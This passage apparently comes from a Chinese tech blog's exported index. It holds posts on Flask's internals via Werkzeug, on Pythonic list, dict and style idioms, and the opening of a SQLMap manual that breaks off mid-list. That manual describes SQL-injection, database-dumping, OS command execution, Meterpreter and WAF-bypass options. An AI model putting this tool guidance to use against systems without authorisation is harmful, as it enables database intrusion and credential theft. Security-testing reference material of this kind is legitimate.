hello 函数里 print 的内容。\nFlask 执行流程初探在 WerkZeug 启动后，我们能发现它的控制台输出与 Flask 的输出非常类似。接着，查看 Flask 类的源码，在 Flask 类的 run 方法 ( 612 ) 行附近，你会看到这段代码\nfrom werkzeug.serving import run_simpletry:    run_simple(t.cast(str, host), port, self, **options)\n\n也就是说，Flask 的 run 方法实际上就是通过调用 Werkzeug 的  run_simple 函数启动的 WebServer 。联系一下给出的 Werkzeug 代码示例，不难猜到 t.cast(str,host) 是经 Flask 处理后填入的 IP 地址，port 则是端口，从位置参数来看，self 对应的是示例中的 hello 函数。这种把对象实例当作函数传入的方法不由得让我们想起了 __call__ 魔术方法，接着查看 Flask 的源代码在 1481 行附近我们成功的找到了 Flask 类的  __call__ 魔术方法实现，它长这样\ndef __call__(    self, environ: WSGIEnvironment, start_response: StartResponse) -&gt; cabc.Iterable[bytes]:\n\n不出我们所料，它的函数签名与 Werkzeug 代码示例中的 hello 函数的函数签名非常的相似。\n这很难不让我们突发异想用之前在 Flask Demo 看到的代码执行的方式实现 Werkzeug 代码示例中的效果\nfrom werkzeug.serving import run_simpleclass Flask(object):    def __init__(self,*args) -&gt; None:        pass    def __call__(self, environ, start_response):        print(&quot;HelloWorld&quot;)            def run(self):        run_simple(&quot;127.0.0.1&quot;, 5000, self)app = Flask(__name__)if __name__ == &quot;__main__&quot;:    app.run()\n\n此时，我们所写的 Flask 类已经与 Flask 框架中的 Flask 类的工作原理非常接近了。但是访问了这段代码所启动的 WebServer 后，我们无法像 Flask Demo 那样得到响应，如果直接把 __call__ 方法中的 print 语句改为 return 的话，会得到这样的报错\nfrom werkzeug.serving import run_simpleclass Flask(object):    def __init__(self,*args) -&gt; None:        pass    def __call__(self, environ, start_response):        return &quot;HelloWorld&quot;            def run(self):        run_simple(&quot;127.0.0.1&quot;, 5000, self)app = Flask(__name__)if __name__ == &quot;__main__&quot;:    app.run()#* 127.0.0.1 - - [04/Apr/2024 19:06:21] &quot;GET / HTTP/1.1&quot; 500 -#* Error on request:#* Traceback (most recent call last):#*   File &quot;/usr/lib/python3.11/site-packages/werkzeug/serving.py&quot;, line 364, in run_wsgi#*     execute(self.server.app)#*   File &quot;/usr/lib/python3.11/site-packages/werkzeug/serving.py&quot;, line 328, in execute#*     write(data)#*   File &quot;/usr/lib/python3.11/site-packages/werkzeug/serving.py&quot;, line 255, in write#*     assert status_set is not None, &quot;write() before start_response&quot;#*            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^#* AssertionError: write() before start_response\n\n这表明我们的返回值没有满足 WerkZeug 的某种要求。让我们阅读 Flask 的源代码，看看它是如何进行返回的\ndef __call__(    self, environ: WSGIEnvironment, start_response: StartResponse) -&gt; cabc.Iterable[bytes]:    return self.wsgi_app(environ, start_response)\n\n我们对函数返回值的调用链进行追踪，依次可以得到\ndef wsgi_app(    self, environ: WSGIEnvironment, start_response: StartResponse) -&gt; cabc.Iterable[bytes]:    ...    response = self.full_dispatch_request()    ...    return response(environ, start_response)def full_dispatch_request(self) -&gt; Response:    ...    return self.finalize_request(rv)def finalize_request(    self,    rv: ft.ResponseReturnValue | HTTPException,    from_error_handler: bool = False,) -&gt; Response:    response = self.make_response(rv)    ...    return responsedef make_response(self, rv: ft.ResponseReturnValue) -&gt; Response:    &quot;&quot;&quot;Convert the return value from a view function to an instance of    :attr:`response_class`.    :param rv: the return value from the view function. The view function            must return a response.    ...    &quot;&quot;&quot;    ...    if not isinstance(rv, self.response_class):        if isinstance(rv, (str, bytes, bytearray)) or isinstance(rv, cabc.Iterator):            rv = self.response_class(                rv,                status=status,                headers=headers,  # type: ignore[arg-type]            )    ...    return rv\n\n经过一系列的溯源追踪，我们定位到了 Flask 类的 make_response 方法。通过阅读注释我们得知 rv 就是视图函数的返回值，以 Flask Demo 为例则 rv 是 str 类型的字面值 HelloWorld，即 rv: str = &quot;HelloWorld&quot;。make_response 方法会针对视图函数的返回值的类型对其进行对应的处理与封装，由于在本例中 rv 是字符串，程序会执行上面代码中保留的逻辑，将 HTTP 响应封装为一个 self.response_class 类型的实例。让我们查看它的定义\n# flask/app.pyclass Flask(App):    ...    response_class: type[Response] = Response    ...# flask/wrappers.pyclass Response(ResponseBase):    ...# werkzeug/wrappers.py#！ werkzeug 的源代码中其实是 class Response(_SansIOResponse):class ResponseBase(_SansIOResponse):\n\n我们发现，Flask 定义了继承自 WerkZeug 的 ResponseBase 类的 Response 类作为自己的 HTTP 响应。也就是说，Flask 框架响应的 HTTP Response 实际上是进行了一些封装的 WerkZeug 的 Response 类。让我们用 WerkZeug 的 Response 类作为返回值，仿照一下 Flask 框架的写法更新一下上文中我们自己实现的 Flask 类\nfrom werkzeug.serving import run_simplefrom werkzeug.wrappers import Responseclass Flask(object):    def __init__(self,*args) -&gt; None:        pass    def __call__(self, environ, start_response):        msg =  &quot;HelloWorld&quot;        resp = Response(msg)        return resp(environ,start_response)            def run(self):        run_simple(&quot;127.0.0.1&quot;, 5000, self)app = Flask(__name__)if __name__ == &quot;__main__&quot;:    app.run()\n\n程序运行后，让我们访问一下启动的 WebServer\n❯ curl localhost:5000HelloWorld%\n\n很好，符合我们的预期\n总结此时，我们已经能够对 Flask 的运行原理有了一个比较初步的认识\n一个 WebServer 实际上可以分为 HTTP 服务器与 Web 应用程序两个部分。当用户发起了一个请求，这一请求通过 socket 发送到服务器后，会被 HTTP 服务器接收。HTTP 服务器会将其交给 Web 应用程序进行业务处理。在 Flask 框架创建的应用程序中，其依赖 WerkZeug 负责实现 HTTP 服务器所需要实现的功能，而 Flask 则作为一个 Web 应用被 HTTP 服务器所调用，通过传入的请求信息，例如 URL , HTTP Method 等信息执行对应的视图函数以实现对应的业务处理逻辑，例如表单检查，数据库 CRUD 等，并返回 HTTP Response 给用户。具体地说，Flask 通过 run 方法调用 WerkZeug 启动 HTTP 服务器，当用户的请求到达服务器时，HTTP 服务器会调用 Flask，Flask 再通过 __call__ 方法调用处理相关逻辑的其他方法，最终返回封装后的 WerkZeug 框架中的 Response 类实例给 HTTP 服务器，HTTP 服务器再生成响应的 HTTP Response 返回给用户\n以上是本博客基于博客内容对 Flask 框架原理的简单概括\nTipsWSGIHTTP 服务器与 Web 应用程序之间的交互需要一个接口，Python 将这一接口称作 WSGI (由 PEP 333 所规定)。只要 HTTP 服务器和 Web 应用程序框架都遵守这个约定，就能实现两者的自由组合。而按照这一规定，一个面向 WSGI 的 Web 应用程序框架必须实现以下方法\ndef application(environ,start_response)\n\n其中的 environ 参数是一个字典，Web 应用程序从中获取请求信息。start_response 是一个函数，Web 应用程序进行业务处理后通过调用该函数设置响应头，并返回响应体(响应体需要是可迭代的)给 HTTP 服务器，HTTP 服务器再返回响应给用户\nWerkZeugWerkZeug 是 Flask 唯一不可或缺的依赖，负责完成 WebServer 中较为底层的工作，例如请求与响应处理、中间件、调试器、实现 URL 到视图的映射、线程保护等等。它非常的强大，不过迫于精力与技术水平的有限，本系列不会深入 WerkZeug 的源码与实现，也不会深入 Jinja2 模板渲染、蓝图等额外功能的源码与实现，而是将主要篇幅放在 Flask 框架作为 WebServer 的核心源码上，如果你对 WerkZeug 感兴趣，可以到它们的官方仓库下阅读相关文档进行更深入的了解\nReferenceFlask RepoFlaskWerkZeug\n","categories":["Tech Blog"]},{"title":"To Be Pythonic Ⅱ 列表与字典","url":"/2024/01/31/Tech%20Blog/To-Be-Python-%E2%85%A1/","content":"list 和 dict 作为用途非常广泛的数据结构，在使用了 Python 提供的特殊语法与模块后，可以用清晰的代码实现出很多简单的 array 、 vector 与 hash table 所不能比的强大的功能\n\n\n对序列做切片Python 中所有实现了 getitem 与 setitem 这两个特殊方法的类都能产生切片。Python 内置的 list、str 与 bytes是这种类的典型。最基本的写法是用list[start:end]这一形式产生从 start 到 end 处但不包括 end 处元素的切片。如果从头开始产生切片，或者切片一直取到序列末尾，则冒号左边的 0 和右边的列表长度值都应该省略使其看起来更清晰\n切片可以出现在赋值符号左侧，与 unpacking 形式的赋值不同，对于切片的复制两侧的元素个数可以不同，也就是说\na,b = c[x:x+2] # ✔a,b = c[x:x+3] # ❌\n\n对于 unpacking 来说只有第一种写法才是合法的，但如果是切片\n# b = a[:3]b = [1,2,3,4]b = [1,2]\n\n这两种写法都是合法的，此时的赋值实际表示用右侧的元素替换原列表中位于这个位置范围的元素，在等号左右元素数量不同时会导致原本的列表的长度发生改变。\n停止在切片中同时指定起始下标于步进除了最基本的切片写法，Python 还有一种特殊的步进切片形式list[start:end:stride], stride 是步长，即每多少个取一个元素作为切片成员。带有步进的切片经常会引发意外的效果。例如 Python 中有一个常见的技巧，以 -1 为步长对 bytes 类型的字符串做切片就能将字符串翻转过来，但若该字符串为 UTF-8 标准的字节数据，则会导致 UnicodeDecodeError 。同时使用起止下标和步进会让切片会增大阅读程序时的思考负担。如果要使用步进，最好省略起止下标并采用正数作为步长，或者使用 itertools 模块内的 islice 方法完成对应任务\n通过带星号的 unpacking 操作捕获多个元素进行 unpacking 操作时必须提前确定需要拆解的序列长度。当存在不确定序列长度的情况是，可以通过带星号的表达式( starred expression)解决。这种表达式可以囊括所有剩余元素\nlist_case = [1,2,3,4,5]first , *others , last = list_caseprint(first,others,last)#1 [2, 3, 4] 5*others , sub_last , last = list_caeprint(others,sub_last,last)#[1, 2, 3] 4 5first , second , *others = list_caseprint(first,second,others)#1 2 [3, 4, 5]first , *others , last = [1,2]print(first,others,last)#1,2,[]\n\n星号表达式需要搭配其他变量一同使用，以及对于单层结构来说，同一级只能使用一个带星号的表达式。也就是说，下面的写法是不合法的\n*others = list_casefirst , *others1 , *others2 , last = [1,2,3,4]\n\n带有星号的 unpacking 操作也可以作用于迭代器，可以使用带星号的表达式形成列表以囊括迭代器能够产生的其余元素\n用 sort 方法的 key 参数来表示复杂的排序逻辑list 对象具有 sort 方法，可以使用多种方式给 list 实例中的元素排序。在默认情况下，sort 方法按照自然升序排列列表内的元素。凡是具备自然顺序的 Python 内置类型都可以用 sort 方法排序，例如字符串，浮点数等。但在更常见的情形下，很多对象需要在不同的情况下按照不同的标准进行排序，此时自然排序并不一定能很好的达到开发者的目的。 sort 方法可以使用 key 参数实现复杂的排序逻辑。key 参数可以接收函数作为参数，这个函数需要带有一个参数，并返回一个可以进行比较的值，sort 方法会根据函数的返回值为对象进行排序\nclass Obj(object):    def __init__(self,a,b,c):        self.a = a        self.b = b        self.c = c    def __repr__(self) -&gt; str:        return f&quot;Obj: a:&#123;self.a&#125; b:&#123;self.b&#125; c:&#123;self.c&#125;&quot;obj_list = [    Obj(2,1,&quot;bar&quot;),    Obj(1,1,&#x27;foo&#x27;)]obj_list.sort(key=lambda x:x.a)print(obj_list)obj_list.sort(key=lambda x:x.c)print(obj_list)obj_list.sort(key=lambda x:(x.b,x.a))print(obj_list)#[Obj: a:1 b:1 c:foo, Obj: a:2 b:1 c:bar]#[Obj: a:2 b:1 c:bar, Obj: a:1 b:1 c:foo]#[Obj: a:1 b:1 c:foo, Obj: a:2 b:1 c:bar]\n\n我们需要以哪一个属性作为排序依据，传给 key 的函数就返回对象实例的哪一个属性。当需要根据多个属性的值作为排序依据时，函数可以返回一个对应的元组，利用元组若首个元素相等则比较第二个元素，仍然相等则继续往后比较的特性比较不同对象\n不要过分依赖给字典添加键值对时所用的排序在 Python 3.5 及其以前的版本中，字典类型通过哈希表算法实现，该算法通过内置的 hash 函数与一个随机的，在每次启动 Python 解释器时确定的种子数运行。这样的机制导致键值对在字典中的存放顺序不一定与添加时的顺序相同并且每次运行程序存放顺序都可能不同。但在 Python 3.6开始，字典会保留这些键值对在添加时所用的顺序，Python 3.7 的语言规范确立了这一规则。虽然内置的 collections 模块提供了这种保留了插入顺序的字典 OrderedDict ， 但二者性能上有着很大的区别，在此就不过多赘述。由于这一语言规范仍相对较新，最好不要太过分依赖给字典添加键值对时所用的顺序\n用 get 处理键不再字典中的情况，不要使用 in 与 keyError字典的内容常常发生变动，所以完全有可能会出现这样一种应用情景，我们不确定想要访问的键值对是否还在字典中。解决这一问题的常见的写法是\n# Use in keywordif key in dictionary:    do(dictionary[key])else:    do_else()# Use KeyError exceptiontry:    do(dictionary[key])except KeyError:    do_else()\n\nPython 内置的字典类型提供了 get 方法用以更简洁地完成这个任务。get 方法的第一个参数是需要访问的键，第二个参数是该键不存在时的返回值，例如\ndictionary.get(key,0)\n\n用 defaultdict 处理内部状态中确实的元素而非 setdefault字典还提供了 setdefault 方法，它接收两个参数，第一个参数是想要查询的键，第二个参数是一个默认值。当字典中存在这个键时，方法返回对应的值，否则将默认值与键关联起来并插入到字典中。但在 setdefault 适用的解决问题方式的范围内，Python 内置的 collections 模块提供了 defaultdict 类，它能够轻松地实现在需要查找的键缺失时自动添加该键与其对应默认值的业务逻辑，更好地解决对应问题。在绝大多数情况下，用 defaultdict 处理内部状态中确实的元素而非 setdefault 往往是更好的方案，对于没法用 defaultdict 解决的问题，我们也完全由其他的 Python 工具对其进行处理\n用 missing 构造依赖键的默认值对于 setdefault 和 defaultdict 都无法处理的任务，Python 内置了一种解决方案，可以通过继承 dict 类型并实现 missing 方法解决这一问题。\nclass Obj(dict):    def __missing__(self,key):        value = ...        self[key] = value        return value\n\n当访问 dictionary[key] 时，如果 dictionary 字典中没有对应的键，missing 方法会将默认值与键配对插入到字典中，并返回该值。(类似的机制还体现在 getattr 方法中)\n","categories":["Tech Blog"]},{"title":"To Be Pythonic Ⅰ","url":"/2024/01/18/Tech%20Blog/To-Be-Pythonic-%E2%85%A0/","content":"该系列为我阅读 Effective Python 90 Specific Ways to Write Better Python, Second Edition 并结合我的 Python 编程心得的梳理总结\n遵循 PEP 8 风格指南PEP是 Python  Enhancement Proposal的缩写，通常翻译为“ Python 增强提案”。每个PEP都是一份为 Python 社区提供的指导 Python 往更好的方向发展的技术文档，其中的第8号增强提案（PEP 8）是针对 Python 语言编订的代码风格指南。尽管我们可以在保证语法没有问题的前提下随意书写 Python 代码，但是在实际开发中，采用一致的风格书写出可读性强的代码是每个专业的程序员应该做到的事情，也是每个公司的编程规范中会提出的要求，这些在多人协作开发一个项目（团队开发）的时候显得尤为重要。一些强烈建议遵守的规则包括但不限于:\n空白\n用空格(Space)表示缩进，而不要使用制表符(Tab)\n和语法相关的每一层缩进用4个空格表示\n每行不超过79个字符\n对于占据多行的长表达式，除了首航之外的其余各行都应该在通常的缩进级别之上再加4个空格\n同一份文件中，函数和类之间用两个空行隔开\n同一个类中，方法与方法之间用一个空行隔开\n使用使用字典时，键与冒号之间不加空格，写在同一行的冒号和值之间应该加一个空格\n给变量赋值时，复制符号的左边和右边都应该加且仅加一个空格\n给变量的类型做注解是，变量名和冒号不应该分开，但类型信息前应该有一个空格\n\n命名\n函数、变量及属性遵循snake_case命名规范\n受保护的实例属性用_开头\n私有的实例属性用__开头\n类(包括异常)的命名遵循CamelCase命名规范\n模块级别的变量的所有字母大写并，各个单词通过_连接\n类中的实例方法，应该把第一个参数命名为self，表示对象本身\n类方法的第一个参数，应该命名为cls，表示类本身\n\n表达式和语句The Zen of Python 中提到，每件事都应该有最简单的做法，而且最好只有一种*(There should be one– and preferably only one –obvious way to do it)*，这也是 PEP 8 规范表达式和语句的写法的理念\n采用行内否定把否定词直接放在要否定的内容前面，而不要放在整个表达式前面\nPythonic :\nif a is not b\n\nNot Pythonic :\nif not a is b\n\n用Python的方式判断True or False不要通过长度或是否等于 &#39;&#39; &#x2F; None &#x2F; [] &#x2F; &#123;&#125; &#x2F; () 判断容器与序列是否为空，而是直接通过if语句进行判断\n if x:if not x:\n\nPythonic :\nname = &#x27;7erry&#x27;fruits = [&#x27;7erry&#x27;]owners = &#123;&#x27;7777&#x27;: &#x27;7erry&#x27;&#125;if name and fruits and owners:    print(&#x27;I love fruits!&#x27;)\n\nNot Pythonic :\nname = &#x27;7erry&#x27;fruits = [&#x27;7erry&#x27;]owners = &#123;&#x27;7777&#x27;: &#x27;7erry&#x27;&#125;if name != &#x27;&#x27; and len(fruits) &gt; 0 and owners != &#123;&#125;:    print(&#x27;I love fruits!&#x27;)\n\n与引入有关的建议\nimport语句总是放在文件开头的地方\n引入模块的时候，from XXX import YYY比import XXX更好。\n如果有多个import语句，应该将其分为三部分，从上到下分别是Python标准模块、第三方模块和自定义模块，每个部分内部应该按照模块名称的字母表顺序来排列。\n\n\nfrom XXX import YYY真的总是比import XXX好吗?我想这应该是见仁见智的，在Rust语言圣经的一个章节中,它的作者在讲解以下代码的时候提到\n&gt;// in main.rs&gt;use std::env;&gt;fn main() &#123;   let args: Vec&lt;String&gt; = env::args().collect();   dbg!(args);&gt;&#125; \n\n\n“可能有同学疑惑，为啥不直接引入 args ，例如 use std::env::args ，这样就无需 env::args 来繁琐调用，直接args.collect() 即可。原因很简单，args方法只会使用一次，啰嗦就啰嗦点吧，把相同的好名字让给 let args.. 这位大哥不好吗？毕竟人家要出场多次的。”\n\nPylint 是一款流行的 Python 源代码静态分析工具，它会检查受测代码是否遵循 PEP 8 风格指南并找出程序中存在的错误。许多 IDE 和编辑器以及其他语言都有着这样的 linting 工具,可以借助它们规范你的代码\n\n了解 bytes 和 str 的区别Python 有两种类型可以表示字符序列，一个函数bytes,一个是str.bytes实例包含的是原始数据，即八位的无符号值，str实例包含的则是Unicode码点。二者可以借由encode与decode两个方法进行转换。\n在编写 Python 程序的时候，应该把解码和编码的操作放到界面最外层来做，让程序的核心部分可以使用 Unicode 数据运作，这种方式被叫做 Unicode 三明治（ Unicode Sanwich）。程序的核心部分，应该使用 str 类型来表示 Unicode 数据，并且不要锁定到某种字符编码上面。 这样可以让程序接受许多种字符编码，并把它们转换成 Unicode , 也能保证输出的文本信息都是用同一种标准\n用 f-string 代替 C 风格的格式字符串与 str.format 方法格式化是值把数据填写到预先定义的文本模板里面，形成一条用户可读消息，并把这条消息保存成字符串的过程。用 Python 对字符串做格式化处理有四种办法可以考虑，它们都内置在语言和标准库里。即，采用%格式化操作符，也就是 C 风格的格式化字符串，内置的format函数和str类的format方法与插值格式字符串(即f-string),这四种办法有各自的优劣，其中C语言使用第一种， Rust 等语言使用第二、三种， Python 则推荐使用 f-string ，即在格式字符串前面加字母f作为前缀，与字母 b 和字母 r 的用法类似。Python 认为 f-string 与其配套的迷你语法最能够简洁而清晰地表达出各种逻辑，因此在编写 Pythonic Code 的时候，Pythoneer 往往都采用 f-string 作为格式化字符的首选。\n使用 UnpackingPython 具有unpacking机制，在其他语言例如 Rust 中，这种机制也被叫做模式匹配，它可以帮助我们通过更少的代码更清晰地完成一些任务\nPythonic :\na, b = b, a\n\nNot Pythonic :\nc = aa = bb = c\n\n这样写可以成立的原因是，Python 处理赋值运算的时候，要先对=右边求职，于是，它会新建一个临时的元组，把b和a的值放到元组里，然后把临时元组里的值再分别写入=左边的变量中。unpacking 结束后，这个临时的元组会被释放掉。\n除此以外，unpacking 机制也在构建列表，给函数设计参数列表，传递关键字参数，接受多个返回值等多处有着重要作用。它的另一个重要用法是与 enumerate 函数结合使用使得我们的代码变得更加清晰\n用 in 取代 findif x in items: # 包含for x in items: # 迭代\n\nPythonic :\nname = &#x27;7erry&#x27;if &#x27;L&#x27; in name:   print(&#x27;The name has an L in it.&#x27;)\n\nNot Pythonic :\nname = &#x27;7erry&#x27;if name.find(&#x27;L&#x27;) != -1:    print(&#x27;This name has an L in it!&#x27;)\n\n用 enumerate 取代 rangeenumerate函数可以将迭代器封装为惰性生成器实现需要获取迭代对象长度时对迭代器的更简洁的迭代\nPythonic :\nfruits = [&#x27;orange&#x27;, &#x27;grape&#x27;, &#x27;pitaya&#x27;, &#x27;blueberry&#x27;]for index, fruit in enumerate(fruits):print(index, &#x27;:&#x27;, fruit)\n\nNot Pythonic :\nfruits = [&#x27;orange&#x27;, &#x27;grape&#x27;, &#x27;pitaya&#x27;, &#x27;blueberry&#x27;]index = 0for fruit in fruits:   print(index, &#x27;:&#x27;, fruit)   index += 1\n\n用 zip 函数同时遍历两个迭代器zip函数用于创建惰性生成器，让它每次生成一个元组，当提供的迭代器长度不同时，当任何一个迭代器迭代完毕，zip就会停止，如果想按最长的迭代器遍历则可以改用 itertools 模块下的zip_longest函数\nPythonic :\nkeys = [&#x27;1001&#x27;, &#x27;1002&#x27;, &#x27;1003&#x27;]values = [&#x27;Jerry&#x27;, &#x27;7erry&#x27;, &#x27;JeRy&#x27;]d = dict(zip(keys, values))print(d)\n\nNot Pythonic :\nkeys = [&#x27;1001&#x27;, &#x27;1002&#x27;, &#x27;1003&#x27;]values = [&#x27;Jerry&#x27;, &#x27;7erry&#x27;, &#x27;JeRy&#x27;]d = &#123;&#125;for i, key in enumerate(keys):   d[key] = values[i]print(d)\n\n不要在for和while循环后写else块Python 的 for&#x2F;else 和 while&#x2F;else 结构的设计时为了实现搜索逻辑，但我们完全可以用辅助函数等其他方式更简洁更优雅的实现相同的效果，这一设计带来的困惑已经盖过了它的好处，最好不要采用这种写法\nReferenceEffectivce Python:90 Specific Ways to Write Better Python,Second Editionhttp://safehammad.com/downloads/python-idioms-2014-01-16.pdf\n","categories":["Tech Blog"]},{"title":"SQLMap 使用手册","url":"/2023/07/24/Tech%20Blog/SQLMap%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/","content":"简介SQLMap是功能强大的自动化SQL注入开源工具，能够检测动态页面中的get&#x2F;post参数,cookie,http头,能查看数据，访问文件系统甚至执行系统命令，支持对MySQL,Oracle,PostgreSQL,MSSQL,SQLite等数据进行布尔盲注，时间盲注，联表注入与堆叠注入等攻击。\n\nSQLMap的特点有\n\n全面支持MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAP MaxDB、Informix、MariaDB、MemSQL、TiDB、CockroachDB、HSQLDB、H2、MonetDB、Apache Derby、Amazon Redshift、Vertica、Mckoi、Presto、Altibase、MimerSQL、CrateDB、Greenplum、Drizzle、Apache Ignite、Cubrid、InterSystems Cache、IRIS、eXtremeDB、FrontBase、Raima Database Manager、YugabyteDB、ClickHouse和Virtuoso数据库管理系统。\n全面支持六种SQL注入技术：基于布尔的盲、基于时间的盲、基于错误、基于UNION查询、堆叠查询和带外查询。\n通过提供DBMS凭证、IP地址、端口和数据库名称，支持直接连接到数据库，而无需通过SQL注入。\n支持枚举用户、密码散列、特权、角色、数据库、表和列。\n自动识别密码哈希格式，并支持使用基于字典的攻击破解它们。\n支持完全转储数据库表，一系列条目或特定列，根据用户的选择。用户还可以选择只转储每列条目中的字符范围。\n支持搜索特定的数据库名称、所有数据库中的特定表或所有数据库表中的特定列。例如，这对于标识包含自定义应用程序凭据的表非常有用，其中相关列名包含name和pass等字符串。\n当数据库软件为MySQL、PostgreSQL或Microsoft SQL Server时，支持从数据库服务器底层文件系统下载和上传任何文件。\n当数据库软件为MySQL、PostgreSQL或Microsoft SQL Server时，支持在数据库服务器底层操作系统上执行任意命令并检索其标准输出。\n支持在攻击机器和数据库服务器底层操作系统之间建立带外有状态TCP连接。根据用户的选择，该通道可以是交互式命令提示符、Meterpreter会话或图形用户界面（VNC）会话。\n通过Metasploit的Meterpreter getsystem命令支持数据库进程的用户权限提升。\n\n目录介绍\n-doc目录：保护sqlmap的简要说明，具体使用说明，作者信息等。\nextra目录：包含sqlmap的额外功能，如发出声响、允许cmd、安全执行等。\nlib目录：sqlmap核心目录。\nplugins目录：包含了sqlmap目前支持的13种数据库信息和数据库通用事项。\nprocs目录：包含了mssql、mysql、oracle、postgresql的触发程序。\nshell目录：包含了注入成功后的9种shell远程命令执行。\ntamper目录：包含了waf绕过脚本。\nthirdparty目录：包含了第三方插件，例如优化，保持连接，颜色。\ntxt目录：包含了表名字典，列名字典，UA字典等。\nudf目录：存放攻击载荷。\nwaf目录：存放waf特征判断脚本。\nxml目录：存放多种数据库注入检测的payload等信息\n\n参数列表常用参数sqlmap -h获取常用参数说明sqlmap -hh获取所有参数与说明\n一般选项参数通过一般选项参数设置SQLMap的一般工作方式\n\n-s SESSIONFILE      保存和恢复检索会话文件的所有数据\n-t TRAFFICFILE      记录所有HTTP流量到一个文本文件中\n–batch             从不询问用户输入，使用所有默认配置。\n–binary-fields&#x3D;..  结果字段具有二进制值(e.g.”digest”)\n–charset&#x3D;CHARSET   强制字符编码\n–crawl&#x3D;CRAWLDEPTH  从目标URL爬行网站\n–crawl-exclude&#x3D;..  正则表达式从爬行页中排除\n–csv-del&#x3D;CSVDEL    限定使用CSV输出 (default”,”)\n–dump-format&#x3D;DU..  转储数据格式(CSV(default), HTML or SQLITE)\n–eta               显示每个输出的预计到达时间\n–flush-session     刷新当前目标的会话文件\n–forms             解析和测试目标URL表单\n–fresh-queries     忽略在会话文件中存储的查询结果\n–hex               使用DBMS Hex函数数据检索\n–output-dir&#x3D;OUT..  自定义输出目录路径\n–parse-errors      解析和显示响应数据库错误信息\n–save&#x3D;SAVECONFIG   保存选项到INI配置文件\n–scope&#x3D;SCOPE       从提供的代理日志中使用正则表达式过滤目标\n–test-filter&#x3D;TE..  选择测试的有效载荷和&#x2F;或标题(e.g. ROW)\n–test-skip&#x3D;TEST..  跳过试验载荷和&#x2F;或标题(e.g.BENCHMARK)\n–update            更新sqlmap\n-h,–help           显示基本帮助信息并退出\n-hh                 显示高级帮助信息并退出\n–version           显示程序版本信息并退出\n-vVERBOSE           信息级别: 0-6 （缺省1），其值具体含义：“0”只显示python错误以及严重的信息；1同时显示基本信息和警告信息（默认）；“2”同时显示debug信息；“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3。\n\n目标参数通过目标参数提供不少于一个确定目标\n\n-d DIRECT           直接连接数据库的连接字符串\n-u URL, –url&#x3D;URL   目标URL (e.g.”http://www.site.com/vuln.php?id=1&quot;)，使用-u或者--url\n-l LOGFILE          从Burp或者WebScarab代理日志文件中分析目标\n-x SITEMAPURL       从远程网站地图（sitemap.xml）文件来解析目标\n-m BULKFILE         将目标地址保存在文件中，一行为一个URL地址进行批量检测。\n-r REQUESTFILE      从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个–force-ssl参数来使用，或者可以在Host头后门加上:443\n-g GOOGLEDORK       从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）\n-c CONFIGFILE       从配置ini文件中加载选项\n\n请求参数通过请求参数指定如何连接到目标URL\n\n–method&#x3D;METHOD     强制使用给定的HTTP方法（例如put）\n–data&#x3D;DATA         通过POST发送数据参数，sqlmap会像检测GET参数一样检测POST的参数。–data&#x3D;”id&#x3D;1” -f –banner –dbs –users\n–param-del&#x3D;PARA..  当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。\n–cookie&#x3D;COOKIE     HTTP Cookieheader 值\n–cookie-del&#x3D;COO..  用来分隔cookie的字符串值\n–load-cookies&#x3D;L..  Filecontaining cookies in Netscape&#x2F;wget format\n–drop-set-cookie   IgnoreSet-Cookie header from response\n–random-agent      使用random-agent作为HTTP User-Agent头值\n–host&#x3D;HOST         HTTP Hostheader value\n–referer&#x3D;REFERER   sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入\n-H HEADER, –hea..  额外的http头(e.g.”X-Forwarded-For: 127.0.0.1”)\n–headers&#x3D;HEADERS   可以通过–headers参数来增加额外的http头(e.g.”Accept-Language: fr\\nETag: 123”)\n–auth-type&#x3D;AUTH..  HTTP的认证类型 (Basic, Digest, NTLM or PKI)\n–auth-cred&#x3D;AUTH..  HTTP 认证凭证(name:password)\n–auth-file&#x3D;AUTH..  HTTP 认证PEM证书&#x2F;私钥文件；当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file,key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。\n–ignore-401        Ignore HTTPError 401 (Unauthorized)忽略HTTP 401错误（未授权的）\n–ignore-proxy      忽略系统的默认代理设置\n–ignore-redirects  忽略重定向的尝试\n–ignore-timeouts   忽略连接超时\n–proxy&#x3D;PROXY       使用代理服务器连接到目标URL\n–proxy-cred&#x3D;PRO..  代理认证凭证(name:password)\n–proxy-file&#x3D;PRO..  从文件加载代理列表\n–tor               使用Tor匿名网络\n–tor-port&#x3D;TORPORT  设置Tor代理端口\n–tor-type&#x3D;TORTYPE  设置Tor代理类型 (HTTP,SOCKS4 or SOCKS5 (缺省))\n–check-tor         检查Tor的是否正确使用\n–delay&#x3D;DELAY       可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。\n–timeout&#x3D;TIMEOUT   可以设定一个HTTP(S)请求超过多久判定为超时，10表示10秒，默认是30秒。\n–retries&#x3D;RETRIES   当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。\n–randomize&#x3D;RPARAM  可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样\n–safe-url&#x3D;SAFEURL  提供一个安全不错误的连接，每隔一段时间都会去访问一下\n–safe-post&#x3D;SAFE..  提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。\n–safe-req&#x3D;SAFER..  从文件中加载安全HTTP请求\n–safe-freq&#x3D;SAFE..  测试一个给定安全网址的两个访问请求\n–skip-urlencode    跳过URL的有效载荷数据编码\n–csrf-token&#x3D;CSR..  Parameter usedto hold anti-CSRF token参数用来保存反CSRF令牌\n–csrf-url&#x3D;CSRFURL  URL地址访问提取anti-CSRF令牌\n–force-ssl         强制使用SSL&#x2F;HTTPS\n–hpp               使用HTTP参数污染的方法\n–eval&#x3D;EVALCODE     